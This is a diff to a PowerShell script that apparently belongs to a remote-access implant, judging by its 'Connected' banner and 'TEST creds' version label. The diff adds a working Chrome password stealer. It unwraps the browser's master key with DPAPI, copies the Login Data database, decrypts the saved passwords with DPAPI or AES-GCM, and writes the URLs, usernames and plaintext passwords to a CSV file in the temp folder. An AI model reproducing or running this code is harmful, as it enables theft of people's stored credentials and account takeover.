@@ -411,6 +411,104 @@ function PortSuggest {
         return $false
     }
 }
+function Get-DecryptedChromeCreds {
+    Add-Type -AssemblyName System.Security
+    if (-not (Load-SQLite)) {
+        Output-Log "[ERROR] SQLite not loaded"
+        return "[ERROR] SQLite not loaded"
+    }
+
+    $localStatePath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State"
+    $loginDataPath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
+
+    if (!(Test-Path $localStatePath) -or !(Test-Path $loginDataPath)) {
+        Output-Log "[ERROR] Chrome data not found."
+        return "[ERROR] Chrome data not found."
+    }
+
+    try {
+        $localState = Get-Content $localStatePath -Raw | ConvertFrom-Json
+        $keyRaw = $localState.os_crypt.encrypted_key
+        if (-not $keyRaw) {
+            $keyRaw = $localState.os_crypt.app_bound_encrypted_key
+        }
+        if (-not $keyRaw) {
+            Output-Log "[ERROR] No Chrome encrypted key found."
+            return "[ERROR] No Chrome encrypted key found."
+        }
+
+        $encryptedKey = [Convert]::FromBase64String($keyRaw)
+        $encryptedKey = $encryptedKey[5..($encryptedKey.Length - 1)]
+        $dpapiKey = [System.Security.Cryptography.ProtectedData]::Unprotect($encryptedKey, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
+    } catch {
+        Output-Log "[ERROR] Failed to decrypt Chrome master key: $($_.Exception.Message)"
+        return "[ERROR] Failed to decrypt Chrome master key: $($_.Exception.Message)"
+    }
+
+    $tempDb = "$env:TEMP\LoginData.db"
+    Copy-Item $loginDataPath -Destination $tempDb -Force
+
+    try {
+        $conn = New-Object System.Data.SQLite.SQLiteConnection("Data Source=$tempDb;Version=3;")
+        $conn.Open()
+        $cmd = $conn.CreateCommand()
+        $cmd.CommandText = "SELECT origin_url, username_value, password_value FROM logins"
+        $reader = $cmd.ExecuteReader()
+
+        $results = @()
+        while ($reader.Read()) {
+            try {
+                $url = $reader.GetString(0)
+                $username = $reader.GetString(1)
+                $encPass = $reader["password_value"]
+                $encBytes = New-Object byte[] $encPass.Length
+                $encPass.Read($encBytes, 0, $encBytes.Length) | Out-Null
+
+                if ($encBytes[0] -eq 0x01 -and $encBytes[1] -eq 0x00 -and $encBytes[2] -eq 0x00 -and $encBytes[3] -eq 0x00) {
+                    $plainText = [System.Security.Cryptography.ProtectedData]::Unprotect($encBytes, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
+                }
+                elseif ([System.Text.Encoding]::ASCII.GetString($encBytes[0..2]) -eq "v10") {
+                    try {
+                        $nonce = $encBytes[3..14]
+                        $ciphertext = $encBytes[15..($encBytes.Length - 17)]
+                        $tag = $encBytes[($encBytes.Length - 16)..($encBytes.Length - 1)]
+
+                        $aes = [System.Security.Cryptography.AesGcm]::new($dpapiKey)
+                        $plaintextBytes = New-Object byte[] $ciphertext.Length
+                        $aes.Decrypt($nonce, $ciphertext, $tag, $plaintextBytes)
+                        $plainText = $plaintextBytes
+                    } catch {
+                        Output-Log "[DEBUG] AES-GCM decrypt failed: $($_.Exception.Message)"
+                        continue
+                    }
+                }
+                else {
+                    Output-Log "[DEBUG] Unknown encryption format"
+                    continue
+                }
+
+                $results += "$url,$username,$([System.Text.Encoding]::UTF8.GetString($plainText))"
+            } catch {
+                $errorInfo = $_.Exception | Format-List * -Force | Out-String
+                Output-Log "[DEBUG] General decrypt error:`n$errorInfo"
+                $results += "[!] Failed to decrypt row"
+            }
+        }
+
+        $reader.Close()
+        $conn.Close()
+        Remove-Item $tempDb -Force -ErrorAction SilentlyContinue
+
+        $outPath = "$env:TEMP\chrome_creds.csv"
+        $results | Set-Content -Path $outPath
+        return $outPath
+    } catch {
+        $errorDetails = $_.Exception | Format-List * -Force | Out-String
+        Output-Log "[DEBUG] Exception during Chrome creds extraction:`n$errorDetails"
+        Output-Log "[ERROR] Chrome creds extraction failed: $($_.Exception.Message)"
+        return "[ERROR] Chrome creds extraction failed: $($_.Exception.Message)"
+    }
+}
 
 
 
@@ -672,7 +770,7 @@ ________  ___  ________  ________      ________  ________
     /  /_/__\ \  \ \  \___|\ \  \\\  \ __\ \  \|\  \ \  \_\\ \ 
    |\________\ \__\ \__\    \ \_______\\__\ \_______\ \_______\
     \|_______|\|__|\|__|     \|_______\|__|\|_______|\|_______|  
-                                            TEST creds 16 +sql
+                                            TEST creds 17 +sql
 ${esc}[0m
 
 ${esc}[32m[+] Connected :: $env:USERNAME@$env:COMPUTERNAME
